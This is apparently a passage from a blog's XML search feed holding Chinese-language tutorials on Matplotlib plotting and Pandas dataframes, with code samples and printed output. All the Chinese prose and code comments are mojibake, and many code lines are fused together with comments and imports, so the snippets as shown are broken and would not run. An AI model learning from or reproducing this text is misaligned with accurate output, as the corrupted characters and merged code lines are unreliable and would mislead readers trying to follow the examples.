[è¨» 1] å…¸æ•…ä¾†è‡ªæ–¼éŠ€æ²³ä¾¿è»ŠæŒ‡å—ä¸€æ›¸[è¨» 2] æˆ–æ˜¯é›‡ç”¨æˆ‘åšç§äººå¯«ä½œåŠ©ç†ï¼Ÿï¼è«‹åƒçœ‹æˆ‘åœ¨ SOSReader çš„è¨‚é–±æ–¹æ¡ˆï¼
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>byte code</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Python è‡ªå­¸è³‡æ–™ç§‘å­¸èˆ‡æ©Ÿå™¨å­¸ç¿’å…¥é–€å¯¦æˆ°ï¼šMatplotlib åŸºç¤å…¥é–€</title>
    <url>/2018/05/11/python-data-science-and-machine-learning-matplotlib-tutorial/</url>
    <content><![CDATA[
å‰è¨€æœ¬ç³»åˆ—æ–‡ç« å°‡é€éç³»çµ±ä»‹ç´¹è³‡æ–™ç§‘å­¸ï¼ˆData Scienceï¼‰ç›¸é—œçš„çŸ¥è­˜ï¼Œé€é Python å¸¶é ˜è®€è€…å¾é›¶é–‹å§‹é€²å…¥è³‡æ–™ç§‘å­¸çš„ä¸–ç•Œã€‚é€™é‚Šæˆ‘å€‘å°‡ä»‹ç´¹ Matplotlib é€™å€‹ Python è³‡æ–™è¦–è¦ºåŒ–çš„æ ¸å¿ƒå·¥å…·ã€‚
ä»€éº¼æ˜¯ Matplotlibï¼ŸPython çš„è¦–è¦ºåŒ–å¥—ä»¶æœ‰éœæ…‹çš„ Matplotlibã€Seaborn å’Œ ggplotï¼ˆå€Ÿé¡æ–¼ R çš„ ggplot2ï¼‰å¥—ä»¶ä»¥åŠå‹•æ…‹çš„ Bokeh å¥—ä»¶ï¼ˆé¡ä¼¼æ–¼ D3.jsï¼‰ã€‚å…¶ä¸­ Matplotlib æ˜¯ Python çš„ä¸€å€‹é‡è¦æ¨¡çµ„ï¼ˆPython æ˜¯ä¸€å€‹é«˜éšèªè¨€ä¹Ÿæ˜¯ä¸€ç¨®è† æ°´èªè¨€ï¼Œå¯ä»¥é€éæ•´åˆå…¶ä»–ä½éšèªè¨€åŒæ™‚æ“æœ‰æ•ˆèƒ½å’Œé«˜æ•ˆç‡çš„é–‹ç™¼ï¼‰ï¼Œä¸»è¦ç”¨æ–¼è³‡æ–™è¦–è¦ºåŒ–ä¸Šã€‚ä¸€èˆ¬ä¾†èªªä½¿ç”¨ Matplotlib æœ‰å…©ç¨®ä¸»è¦æ–¹å¼ï¼šç›´æ¥å’Œ Matplotlib çš„å…¨åŸŸ pyplot æ¨¡çµ„äº’å‹•æ“ä½œï¼Œç¬¬äºŒç¨®å‰‡æ˜¯ç‰©ä»¶å°å‘å½¢å¼çš„æ“ä½œæ–¹å¼ã€‚è‹¥æ˜¯åªæœ‰ä¸€å¼µåœ–çš„è©±ä½¿ç”¨å…¨åŸŸ pyplot å¾ˆæ–¹ä¾¿ï¼Œè‹¥æ˜¯æœ‰å¤šå¼µåœ–çš„è©±ç”¨ç‰©ä»¶å°å‘æ“ä½œã€‚ä¸€èˆ¬ä¾†èªª Matplotlib é è¨­å€¼ä¸¦ä¸ç†æƒ³ï¼Œä½†å®ƒçš„å„ªé»åœ¨æ–¼å¾ˆå®¹æ˜“åœ¨ä¸Šé¢å¤–åŒ…ä¸€å±¤æä¾›æ›´å¥½çš„é è¨­å€¼æˆ–æ˜¯è‡ªå·±ä¿®æ”¹é è¨­å€¼ã€‚
ç¬¬ä¸€å¼µ Matplotlib åœ–ç‰‡# å¼•å…¥æ¨¡çµ„import numpy as npimport pandas as pdimport matplotlib.pyplot as plt

x = pd.period_range(pd.datetime.now(), periods=200, freq=&#x27;d&#x27;)x = x.to_timestamp().to_pydatetime()# ç”¢ç”Ÿä¸‰çµ„ï¼Œæ¯çµ„ 200 å€‹éš¨æ©Ÿå¸¸æ…‹åˆ†å¸ƒå…ƒç´ y = np.random.randn(200, 3).cumsum(0)plt.plot(x, y)plt.show()

å¸¸ç”¨å±¬æ€§å’Œåƒæ•¸èª¿æ•´# Matplotlib ä½¿ç”¨é» point è€Œé pixel ç‚ºåœ–çš„å°ºå¯¸æ¸¬é‡å–®ä½ï¼Œé©åˆç”¨æ–¼å°åˆ·å‡ºç‰ˆã€‚1 point = 1 / 72 è‹±å‹ï¼Œä½†å¯ä»¥èª¿æ•´import matplotlib as mplmpl.rcParams[&#x27;lines.linewidth&#x27;] = 5mpl.rcParams[&#x27;lines.color&#x27;] = &#x27;r&#x27;mpl.rcParams[&#x27;figure.figsize&#x27;] = (10, 10)plt.gcf().set_size_inches(10, 10)x = pd.period_range(pd.datetime.now(), periods=200, freq=&#x27;d&#x27;)x = x.to_timestamp().to_pydatetime()# ç”¢ç”Ÿä¸‰çµ„ï¼Œæ¯çµ„ 200 å€‹éš¨æ©Ÿå¸¸æ…‹åˆ†å¸ƒå…ƒç´ y = np.random.randn(200, 3).cumsum(0)plt.plot(x, y)plt.show()

ç‰©ä»¶å°å‘å¼ Matplotlib
# è¨­å®šæ¨™ç±¤plots = plt.plot(x, y)plt.legend(plots, (&#x27;Apple&#x27;, &#x27;Facebook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.5, prop=&#123;&#x27;size&#x27;: &#x27;large&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)plt.show()


# æ¨™é¡Œèˆ‡è»¸æ¨™ç±¤plt.title(&#x27;Random Trends&#x27;)plt.xlabel(&#x27;Date&#x27;)plt.ylabel(&#x27;Cum. Sum&#x27;)plt.figtext(0.995, 0.01, &#x27;CopyRight&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)# é¿å…è¢«åœ–è¡¨å…ƒç´ è¢«è“‹ä½plt.tight_layout()plt.plot(x, y)plt.show()



# å„²å­˜åœ–è¡¨plt.savefig(&#x27;plt.svg&#x27;)


&lt;matplotlib.figure.Figure at 0x120e70828&gt;

# ä½¿ç”¨ç‰©ä»¶å°å‘æ–¹å¼æ§åˆ¶åœ–è¡¨ï¼Œé€éæ§åˆ¶ figure å’Œ axes ä¾†æ“ä½œã€‚å…¶ä¸­ figure å’Œå…¨åŸŸ pyplot éƒ¨åˆ†å±¬æ€§ç›¸åŒã€‚ä¾‹å¦‚ï¼š fig.text() å°æ‡‰åˆ° plt.fig_text()fig = plt.figure(figsize=(8, 4), dpi=200, tight_layout=True, linewidth=1, edgecolor=&#x27;r&#x27;)


&lt;matplotlib.figure.Figure at 0x120c16940&gt;

# è»¸èˆ‡å­åœ–è¡¨fig = plt.figure(figsize=(8, 4))# æ’å…¥ä¸»è¦è»¸ï¼Œå¯ä»¥é€é add_axes æ§åˆ¶è»¸åœ¨åœ–è£¡çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼š[bottom*0.1, left*0.1, top*0.5, right*0.5]ï¼Œfig.add_axes([0.1, 0.1, 0.5, 0.5])ax = fig.add_axes([0.1, 0.1, 0.8, 0.8])ax.set_title(&#x27;Main Axes with Insert Child Axes&#x27;)ax.plot(x, y[:, 0])ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)# æ’å…¥è»¸ax = fig.add_axes([0.15, 0.15, 0.3, 0.3])ax.plot(x, y[:, 1], color=&#x27;g&#x27;)ax.set_xticks([])



# å–®ä¸€åœ–èˆ‡è»¸ç¹ªè£½ï¼ˆsubplots ä¸å¸¶åƒæ•¸å›å‚³æ“æœ‰ä¸€è»¸ figure ç‰©ä»¶ï¼Œå¹¾ä¹ç­‰åŒæ–¼ matplotlib å…¨åŸŸç‰©ä»¶ï¼‰# matplotlib å…§å»ºç‰ˆé¢ç·¨æ’ç³»çµ±ç›¸å°å¥½ç”¨ã€‚åœ–è¡¨å¤§å°ä¸ä¸€å¯ä»¥ä½¿ç”¨ gridspec æ¨¡çµ„figure, ax = plt.subplots()plots = ax.plot(x, y, label=&#x27;&#x27;)figure.set_size_inches(8, 4)ax.legend(plots, (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.25, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)ax.set_title(&#x27;Random trends&#x27;)ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)ax.grid(True) # ä½¿ç”¨æ ¼å­figure.text(0.995, 0.01, &#x27;ACM 2015&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)figure.tight_layout()



# ä½¿ç”¨å­åœ–è¡¨figure, ax = plt.subplots()plots = ax.plot(x, y, label=&#x27;&#x27;)figure.set_size_inches(8, 4)ax.legend(plots, (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), loc=&#x27;best&#x27;, framealpha=0.25, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;, &#x27;family&#x27;: &#x27;monospace&#x27;&#125;)ax.set_title(&#x27;Random trends&#x27;)ax.set_xlabel(&#x27;Date&#x27;)ax.set_ylabel(&#x27;Cum. sum&#x27;)ax.grid(True)figure.text(0.995, 0.01, &#x27;Acm&#x27;, ha=&#x27;right&#x27;, va=&#x27;bottom&#x27;)figure.tight_layout()



# ä½¿ç”¨å­åœ–è¡¨ç”¢ç”Ÿå¤šå€‹åœ–è¡¨fig, axes = plt.subplots(nrows=3, ncols=1, sharex=True, sharey=True, figsize=(8, 8))labelled_data = zip(y.transpose(), (&#x27;Apple&#x27;, &#x27;Faceook&#x27;, &#x27;Google&#x27;), (&#x27;b&#x27;, &#x27;g&#x27;, &#x27;r&#x27;))fig.suptitle(&#x27;Three Random Trends&#x27;, fontsize=16)for i, ld in enumerate(labelled_data):    ax = axes[i]    ax.plot(x, ld[0], label=ld[1], color=ld[2])    ax.set_ylabel(&#x27;Cum. sum&#x27;)    ax.legend(loc=&#x27;upper left&#x27;, framealpha=0.5, prop=&#123;&#x27;size&#x27;: &#x27;small&#x27;&#125;)axes[-1].set_xlabel(&#x27;Date&#x27;)




&lt;matplotlib.text.Text at 0x11eb71278&gt;


å¸¸è¦‹åœ–è¡¨
ç›´æ–¹åœ–ï¼ˆHistogramï¼‰
 # ç›´æ–¹åœ–normal_samples = np.random.normal(size=100) # ç”Ÿæˆ 100 çµ„æ¨™æº–å¸¸æ…‹åˆ†é…ï¼ˆå¹³å‡å€¼ç‚º 0ï¼Œæ¨™æº–å·®ç‚º 1 çš„å¸¸æ…‹åˆ†é…ï¼‰éš¨æ©Ÿè®Šæ•¸plt.hist(normal_samples, width=0.1)plt.show()
 

æ•£ä½ˆåœ–ï¼ˆScatter plotï¼‰
 # æ•£ä½ˆåœ–num_points = 100gradient = 0.5x = np.array(range(num_points))y = np.random.randn(num_points) * 10 + x * gradientfig, ax = plt.subplots(figsize=(8, 4))ax.scatter(x, y)fig.suptitle(&#x27;A Simple Scatter Plot&#x27;)plt.show()


 
 # æ•£ä½ˆåœ– + è¿´æ­¸num_points = 100gradient = 0.5x = np.array(range(num_points))y = np.random.randn(num_points) * 10 + x * gradientfig, ax = plt.subplots(figsize=(8, 4))ax.scatter(x, y)m, c = np.polyfit(x, y, 1) # ä½¿ç”¨ Numpy çš„ polyfitï¼Œåƒæ•¸ 1 ä»£è¡¨ä¸€ç¶­ï¼Œç®—å‡º fit ç›´ç·šæ–œç‡ax.plot(x, m * x + c) # ä½¿ç”¨ y = m * x + c æ–œç‡å’Œå¸¸æ•¸åŒ¯å‡ºç›´ç·šfig.suptitle(&#x27;Scatter with regression&#x27;)plt.show()

ç·šåœ–ï¼ˆLine plotï¼‰
 
 # ç·šåœ–age = [4, 4, 17, 17, 18]points = [2, 20, 22, 24, 20]plt.plot(age, points)plt.show()

é•·æ¢åœ–ï¼ˆBar plotï¼‰
 
 # é•·æ¢åœ–labels = [&#x27;Physics&#x27;, &#x27;Chemistry&#x27;, &#x27;Literature&#x27;, &#x27;Peace&#x27;]foo_data = [3, 6, 10, 4]bar_width = 0.5xlocations = np.array(range(len(foo_data))) + bar_widthplt.bar(xlocations, foo_data, width=bar_width)plt.title(&#x27;Stock Price&#x27;)plt.show()

 

ç›’é¬šåœ–ï¼ˆBox plotï¼‰
 # ç›’é¬šåœ–normal_examples = np.random.normal(size = 100) # ç”Ÿæˆ 100 çµ„æ¨™æº–å¸¸æ…‹åˆ†é…ï¼ˆå¹³å‡å€¼ç‚º 0ï¼Œæ¨™æº–å·®ç‚º 1 çš„å¸¸æ…‹åˆ†é…ï¼‰éš¨æ©Ÿè®Šæ•¸plt.boxplot(normal_examples)plt.show()
 

åœ“é¤…åœ–ï¼ˆPie plotï¼‰
 # åœ“é¤…åœ–data = np.random.randint(1, 11, 5) # ç”Ÿæˆx = np.arange(len(data))plt.pie(data)plt.show()


Python å…¶ä»–è³‡æ–™è¦–è¦ºåŒ–å¥—ä»¶
Seaborn
 # Seabornimport numpy as npimport seaborn as snsimport matplotlib.pyplot as pltsns.set(style=&quot;white&quot;, context=&quot;talk&quot;)rs = np.random.RandomState(7)# æº–å‚™ matplotlib åœ–è¡¨f, (ax1, ax2, ax3) = plt.subplots(3, 1, figsize=(8, 6), sharex=True)# ç”¢ç”Ÿé€£çºŒè³‡æ–™x = np.array(list(&quot;ABCDEFGHI&quot;))y1 = np.arange(1, 10)sns.barplot(x, y1, palette=&quot;BuGn_d&quot;, ax=ax1)ax1.set_ylabel(&quot;Sequential&quot;)# èª¿æ•´æˆ diverging è³‡æ–™y2 = y1 - 5sns.barplot(x, y2, palette=&quot;RdBu_r&quot;, ax=ax2)ax2.set_ylabel(&quot;Diverging&quot;)# éš¨æ©Ÿè³‡æ–™y3 = rs.choice(y1, 9, replace=False)sns.barplot(x, y3, palette=&quot;Set3&quot;, ax=ax3)ax3.set_ylabel(&quot;Qualitative&quot;)# ç§€å‡ºåœ–ç‰‡sns.despine(bottom=True)plt.setp(f.axes, yticks=[])plt.tight_layout(h_pad=3)

 

Bokeh
 # Bokehfrom bokeh.plotting import figure, output_file, show# æº–å‚™è³‡æ–™x = [1, 2, 3, 4, 5]y = [6, 7, 2, 4, 5]# è¼¸å‡ºæˆéœæ…‹ HTMLoutput_file(&quot;lines.html&quot;)# å‰µå»ºæ–°çš„æ¨™é¡Œå’Œè»¸åœ–è¡¨p = figure(title=&quot;simple line example&quot;, x_axis_label=&#x27;x&#x27;, y_axis_label=&#x27;y&#x27;)# ç¹ªè£½ç›´ç·šåœ–p.line(x, y, legend=&quot;Temp.&quot;, line_width=2)# å‘ˆç¾çµæœshow(p)

ç¸½çµä»¥ä¸Šä»‹ç´¹äº† Matplotlib çš„åŸºç¤çŸ¥è­˜å’Œ apiï¼ŒåŒæ™‚ä¹Ÿä»‹ç´¹äº† Python å…¶ä»–è³‡æ–™è¦–è¦ºåŒ–å¥—ä»¶ã€‚ä¸€èˆ¬ä¾†èªª Matplotlib é è¨­å€¼ä¸¦ä¸ç†æƒ³ï¼Œä½†å®ƒçš„å„ªé»åœ¨æ–¼å¾ˆå®¹æ˜“åœ¨ä¸Šé¢å¤–åŒ…ä¸€å±¤æä¾›æ›´å¥½çš„é è¨­å€¼æˆ–æ˜¯è‡ªå·±ä¿®æ”¹é è¨­å€¼ã€‚ä¸€èˆ¬ä¾†èªªæˆ‘å€‘åœ¨é€²è¡Œè³‡æ–™ç§‘å­¸å’Œæ©Ÿå™¨å­¸ç¿’åˆ†æçš„éç¨‹ä¸­æˆ‘å€‘æœƒå…ˆä½¿ç”¨è³‡è¨Šè¦–è¦ºåŒ–å·¥å…·ä¾†äº†è§£æ•´å€‹è³‡æ–™é›†çš„ç‰¹è‰²ä¸¦é‡å°è³‡æ–™é€²è¡Œå¾ŒçºŒçš„è™•ç†å’Œç‰¹å¾µé¸å–ï¼Œæ‰€ä»¥èªªè³‡æ–™è¦–è¦ºåŒ–ä¸åƒ…èƒ½å‘ˆç¾è³‡æ–™åˆ†æçš„çµæœï¼Œå°æ–¼è³‡æ–™åˆ†æçš„éç¨‹ä¹Ÿååˆ†é‡è¦ã€‚
å»¶ä¼¸é–±è®€
[python] numpy axisæ¦‚å¿µæ•´ç†ç­†è¨˜
[ç¬¬ 18 å¤©] è³‡æ–™è¦–è¦ºåŒ– matplotlib
æ•°æ®å¯è§†åŒ–ï¼ˆä¸‰ï¼‰- Seabornç®€æ˜“å…¥é—¨

ï¼ˆimage via matplotlib
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>æ©Ÿå™¨å­¸ç¿’</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>äººå·¥æ™ºæ…§</tag>
        <tag>ç›£ç£å¼å­¸ç¿’</tag>
        <tag>Supervised learning</tag>
        <tag>å¾é›¶é–‹å§‹å­¸è³‡æ–™ç§‘å­¸</tag>
        <tag>Numpy</tag>
        <tag>è³‡æ–™ç§‘å­¸</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
        <tag>matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Python è‡ªå­¸è³‡æ–™ç§‘å­¸èˆ‡æ©Ÿå™¨å­¸ç¿’å…¥é–€å¯¦æˆ°ï¼šPandas åŸºç¤å…¥é–€</title>
    <url>/2017/10/28/python-data-science-and-machine-learning-pandas-tutorial/</url>
    <content><![CDATA[
å‰è¨€æœ¬ç³»åˆ—æ–‡ç« å°‡é€é Python åŠå…¶è³‡æ–™ç§‘å­¸ç”Ÿæ…‹ç³»ï¼ˆNumpyã€Scipyã€Pandasã€Scikit-learnã€Statsmodelsã€Matplotlibã€Scrapyã€Kerasã€TensorFlow ç­‰ï¼‰ä¾†ç³»çµ±æ€§ä»‹ç´¹è³‡æ–™ç§‘å­¸å’Œç›¸é—œçš„çŸ¥è­˜ï¼Œé€é Python å¸¶é ˜è®€è€…é€²å…¥è³‡æ–™ç§‘å­¸çš„ä¸–ç•Œå’Œæ©Ÿå™¨å­¸ç¿’çš„ä¸–ç•Œã€‚åœ¨é€™å€‹å–®å…ƒä¸­æˆ‘å€‘å°‡ä»‹ç´¹ Pandas é€™å€‹åŸºæ–¼ Numpy çš„è³‡æ–™è™•ç†å’Œåˆ†æç¥å…µåˆ©å™¨ã€‚
äº‹å¯¦ä¸Šï¼ŒçœŸå¯¦ä¸–ç•Œä¸¦éå¦‚æ­¤ç¾å¥½ï¼Œå¤§éƒ¨åˆ†è³‡æ–™åˆ†æçš„å·¥ä½œæ™‚é–“æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†éƒ½æ˜¯åœ¨è™•ç†é«’è³‡æ–™ï¼Œå¸Œæœ›è®“è³‡æ–™å¯ä»¥ç¬¦åˆæ¨¡å‹è¼¸å…¥çš„éœ€æ±‚ï¼Œè€Œ Pandas æ­£æ˜¯æ‰®æ¼”é€™å€‹è³‡æ–™é è™•ç†å’Œè³‡æ–™æ¸…æ´—çš„æ ¸å¿ƒè§’è‰²ï¼Œæ˜¯ Python åœ¨å’Œ R çˆ­å¥ªè³‡æ–™ç§‘å­¸ç¬¬ä¸€ç¨‹å¼èªè¨€éœ¸ä¸»æ™‚çš„ç”ŸåŠ›è»ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹ Pandas æ ¸å¿ƒåŠŸèƒ½å’Œè³‡æ–™çš„æ“ä½œæ–¹å¼ã€‚

Pandas æ ¸å¿ƒåŠŸèƒ½ä»‹ç´¹å‰µå»ºè³‡æ–™çµæ§‹åœ¨ Pandas ä¸­ä¸»è¦æœ‰å…©å¤§è³‡æ–™çµæ§‹ï¼šSeriesã€DataFrameï¼Œèˆ‡ Numpy ä¸­çš„ ndarray æ¯”è¼ƒä¸åŒçš„æ˜¯ Pandas DataFrame å¯ä»¥å­˜ç•°è³ªè³‡æ–™ï¼ˆä¸åŒè³‡æ–™å‹åˆ¥ï¼‰ã€‚
Series é¡ä¼¼æ–¼ Python æœ¬èº«çš„ list è³‡æ–™çµæ§‹ï¼Œä¸åŒçš„æ˜¯æ¯å€‹å…ƒç´ æœ‰è‡ªå·±çš„ indexï¼ˆå¯ä»¥è‡ªå·±å‘½åï¼‰ï¼š
%matplotlib inline# å¼•å…¥ numpy å’Œ pandas æ¨¡çµ„import numpy as np import pandas as pds1 = pd.Series([1, 3, 5, np.nan, 6, 8]) # ä½¿ç”¨ Python lits ç”¢ç”Ÿ Seriesï¼Œå…¶ä¸­åŒ…å«ä¸€å€‹å€¼ç‚º NaN print(s1)

0    1.0
1    3.0
2    5.0
3    NaN
4    6.0
5    8.0
dtype: float64

s2 = pd.Series(np.random.randint(2, size=[3])) # ä½¿ç”¨ np.random.randint ç”¢ç”Ÿ 3 å€‹ 0-2ï¼ˆä¸å« 2ï¼‰çš„æ•¸çµ„print(s2)

0    1
1    1
2    1
dtype: int64

DataFrame å¯ä»¥ä½¿ç”¨ np.random.randn ç”¢ç”Ÿå€¼ä¾†å‰µå»ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Python dict é€²è¡Œå‰µå»ºï¼š
# ç”¢ç”Ÿ 20170101-20170106 çš„å€¼ï¼ŒDatetimeIndex([&#x27;2017-01-01&#x27;, &#x27;2017-01-02&#x27;, &#x27;2017-01-03&#x27;, &#x27;2017-01-04&#x27;, &#x27;2017-01-05&#x27;, &#x27;2017-01-06&#x27;], dtype=&#x27;datetime64[ns]&#x27;, freq=&#x27;D&#x27;)dates = pd.date_range(&#x27;20170101&#x27;, periods=6)# ç”¢ç”Ÿ row6,column4 å€‹ standard normal distribution éš¨æ©Ÿå€¼ï¼Œä½¿ç”¨ ABCD ç•¶ columnsï¼Œä½¿ç”¨ dates ç•¶ indexdf0 = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list(&#x27;ABCD&#x27;)) print(df0)

                   A         B         C         D
2017-01-01  1.112542 -0.142577  0.832830 -2.755133
2017-01-02 -0.218838 -0.304488  1.437599 -0.402454
2017-01-03  0.295245 -0.786898 -1.231896 -0.224959
2017-01-04 -0.346745 -1.582944 -0.464175 -0.410576
2017-01-05  0.163782  0.948795 -0.420505 -0.641032
2017-01-06  0.515806 -0.935421 -0.701349 -0.820109

# ä½¿ç”¨ dict ä¾†å‰µå»º DataFrameteams = [&#x27;Web&#x27;, &#x27;Mobile&#x27;, &#x27;Data&#x27;]nums = [12, 14, 34]rd_team_dict = &#123;                &#x27;teams&#x27;: teams,                &#x27;nums&#x27;: nums&#125;rd_team_df = pd.DataFrame(rd_team_dict)print(rd_team_df)

   nums   teams
0    12     Web
1    14  Mobile
2    34    Data

è§€å¯Ÿè³‡æ–™# è§€å¯Ÿè³‡æ–™å‹æ…‹ã€çµæ§‹ã€å…§å®¹å€¼df = pd.DataFrame(&#123; &#x27;A&#x27; : 1.,                    &#x27;B&#x27; : pd.Timestamp(&#x27;20170102&#x27;),                    &#x27;C&#x27; : pd.Series(1,index=list(range(4)),dtype=&#x27;float32&#x27;),                    &#x27;D&#x27; : np.array([3] * 4,dtype=&#x27;int32&#x27;),                    &#x27;E&#x27; : pd.Categorical([&quot;test&quot;,&quot;train&quot;,&quot;test&quot;,&quot;train&quot;]),                    &#x27;F&#x27; : &#x27;foo&#x27; &#125;)# å°å‡ºå…§å®¹å€¼è³‡æ–™å‹åˆ¥print(df.dtypes)

A           float64
B    datetime64[ns]
C           float32
D             int32
E          category
F            object
dtype: object

# å°å‡ºè³‡æ–™ç¶­åº¦print(df.shape)

(4, 6)

# å°å‡ºæ¯è¡Œè³‡æ–™é•·åº¦print(len(df))

4

# å°å‡º DataFrame è³‡æ–™æ¦‚æ³print(df.info())

&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
Int64Index: 4 entries, 0 to 3
Data columns (total 6 columns):
A    4 non-null float64
B    4 non-null datetime64[ns]
C    4 non-null float32
D    4 non-null int32
E    4 non-null category
F    4 non-null object
dtypes: category(1), datetime64[ns](1), float32(1), float64(1), int32(1), object(1)
memory usage: 180.0+ bytes
None

# å°å‡ºåŸºæœ¬æ•˜è¿°çµ±è¨ˆæ•¸æ“šprint(df.describe())

         A    C    D
count  4.0  4.0  4.0
mean   1.0  1.0  3.0
std    0.0  0.0  0.0
min    1.0  1.0  3.0
25%    1.0  1.0  3.0
50%    1.0  1.0  3.0
75%    1.0  1.0  3.0
max    1.0  1.0  3.0

# å°å‡ºé¦– i å€‹æ•¸æ“šprint(df.head(2))

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo

# å°å‡ºå°¾ i å€‹æ•¸æ“šprint(df.tail(2))

     A          B    C  D      E    F
2  1.0 2017-01-02  1.0  3   test  foo
3  1.0 2017-01-02  1.0  3  train  foo

# å°å‡º index å€¼print(df.index)

Int64Index([0, 1, 2, 3], dtype=&#39;int64&#39;)

# å°å‡º columns å€¼print(df.columns)

Index([&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;], dtype=&#39;object&#39;)

# å°å‡º values å€¼print(df.values)

[[1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;test&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;train&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;test&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;train&#39; &#39;foo&#39;]]

# å°å‡ºè½‰ç½® DataFrameprint(df.T)

                     0                    1                    2  \
A                    1                    1                    1   
B  2017-01-02 00:00:00  2017-01-02 00:00:00  2017-01-02 00:00:00   
C                    1                    1                    1   
D                    3                    3                    3   
E                 test                train                 test   
F                  foo                  foo                  foo   

                     3  
A                    1  
B  2017-01-02 00:00:00  
C                    1  
D                    3  
E                train  
F                  foo  

# sort by the index labelsã€‚axis=0 ä½¿ç”¨ index é€²è¡Œ sortï¼Œaxis=1 ä½¿ç”¨ columns é€²è¡Œ sortã€‚ascending æ±ºå®šæ˜¯å¦ç”±å°åˆ°å¤§print(df.sort_index(axis=0, ascending=False))

     A          B    C  D      E    F
3  1.0 2017-01-02  1.0  3  train  foo
2  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
0  1.0 2017-01-02  1.0  3   test  foo

# sort by the values of columnsprint(df.sort_values(by=&#x27;E&#x27;))

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
2  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
3  1.0 2017-01-02  1.0  3  train  foo

é¸å–è³‡æ–™# é¸å–å€¼çš„æ–¹å¼ä¸€èˆ¬å»ºè­°ä½¿ç”¨ 1. loc, 2. iloc, 3. ix# label-location based è¡Œåˆ—æ¨™ç±¤å€¼å–å€¼ï¼Œä»¥ä¸‹å–å‡º index=1 é‚£ä¸€æ¬„ï¼Œ[åˆ—, è¡Œ]print(df.loc[0])

A                      1
B    2017-01-02 00:00:00
C                      1
D                      3
E                   test
F                    foo
Name: 0, dtype: object

# iloc å‰‡é€šéè¡Œåˆ—æ•¸å­—ç´¢å¼•å–å€¼ï¼Œ[åˆ—ï¼Œè¡Œ]print(df.iloc[0:3, 1:2])

           B
0 2017-01-02
1 2017-01-02
2 2017-01-02

# å…¼å®¹ loc å’Œ ilocprint(df.ix[0, &#x27;B&#x27;])

2017-01-02 00:00:00

# å…¼å®¹ loc å’Œ ilocprint(df.ix[1, 3])

3

# å¸ƒæ—å–å€¼ï¼Œå–å‡º A è¡Œå¤§æ–¼ 0 çš„è³‡æ–™print(df[df.A &gt; 0])

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
2  1.0 2017-01-02  1.0  3   test  foo
3  1.0 2017-01-02  1.0  3  train  foo

# ç”¢ç”Ÿ Series å€¼s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range(&#x27;20170102&#x27;, periods=6))print(s1)

2017-01-02    1
2017-01-03    2
2017-01-04    3
2017-01-05    4
2017-01-06    5
2017-01-07    6
Freq: D, dtype: int64

# æ›´æ–°å€¼df.loc[:,&#x27;D&#x27;] = np.array([5] * len(df))print(df)

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  5   test  foo
1  1.0 2017-01-02  1.0  5  train  foo
2  1.0 2017-01-02  1.0  5   test  foo
3  1.0 2017-01-02  1.0  5  train  foo

è™•ç†éºå¤±è³‡æ–™# æŸ¥ç¼ºè£œæ¼df2 = pd.DataFrame(index=dates[0:4], columns=list(df.columns) + [&#x27;E&#x27;])df2.loc[dates[0]:dates[1], :] = 1# drop æ‰ NaN å€¼print(df2.dropna(how=&#x27;any&#x27;))# è£œå…… NaN ç‚º 3print(df2.fillna(value=3))print(df2)# å›å‚³ NaN å¸ƒæ—å€¼ print(pd.isnull(df2))# inplace ç‚º True ç‚ºç›´æ¥æ“ä½œè³‡æ–™ï¼Œä¸æ˜¯æ“ä½œ copy å‰¯æœ¬df2.dropna(how=&#x27;any&#x27;, inplace=True)

            A  B  C  D  E  F  E
2017-01-01  1  1  1  1  1  1  1
